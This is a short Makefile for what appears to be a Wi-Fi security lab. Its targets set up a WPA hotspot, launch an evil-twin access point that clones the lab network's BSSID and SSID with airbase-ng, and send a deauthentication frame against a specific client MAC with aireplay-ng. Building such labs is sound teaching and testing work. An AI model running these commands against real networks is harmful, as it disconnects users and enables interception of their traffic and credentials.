AP_INTERFACE=wlx00c0caabaa8c
AP_BSSID=00:C0:CA:AB:AA:8C
AP_SSID=LAB_WIFI_WPA
AP_CON=LAB_WIFI_WPA_CON
AP_PWD=LAB_WIFI_WPA_PWD
AP_CH=6

STA_MAC=C0:EE:FB:F8:6D:F2

ATK_INTERFACE_OUT=wlp4s0
ATK_INTERFACE_IN=wlxb8eca3d9d777

create_wpa_network:
	nmcli device set $(AP_INTERFACE) managed yes
	nmcli device wifi hotspot ifname $(AP_INTERFACE) con-name $(AP_CON) ssid $(AP_SSID) band bg channel $(AP_CH) password $(AP_PWD)

create_evil_twin:
	nmcli device set $(ATK_INTERFACE_IN) managed no
	sudo airbase-ng -c $(AP_CH) -a $(AP_BSSID) --essid $(AP_SSID) $(ATK_INTERFACE_IN)

send_deauth:
	nmcli device set $(ATK_INTERFACE_OUT) managed no
	sudo aireplay-ng -a $(AP_BSSID) -c $(STA_MAC) -0 1 $(ATK_INTERFACE_OUT)
